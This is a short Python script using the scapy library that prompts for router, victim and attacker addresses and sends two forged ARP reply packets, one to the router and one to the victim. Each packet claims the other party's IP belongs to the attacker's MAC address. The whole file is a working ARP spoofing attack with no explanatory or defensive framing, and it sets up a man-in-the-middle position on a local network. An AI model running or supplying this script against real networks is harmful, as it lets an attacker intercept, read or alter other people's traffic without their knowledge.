from scapy.all import *


routerIp = input("Router IP: ")


routerMac = "00:00:00:00:00:01"

victimIp = input("Victim IP: ")
#victimIp = "192.168.1.17"

victimMac = input("Victim Mac: ")
#victimMac = "00:00:00:00:00:02"

attackerMac = input("Attacker Mac: ")

#attackerMac = "00:00:00:00:00:03"
packet = ARP(op = 2, hwsrc=attackerMac, psrc=victimIp, hwdst=routerMac,
pdst=routerIp)
send(packet)
packet = ARP(op = 2, hwsrc=attackerMac, psrc=routerIp, hwdst=victimMac,
pdst=victimIp)
send(packet)
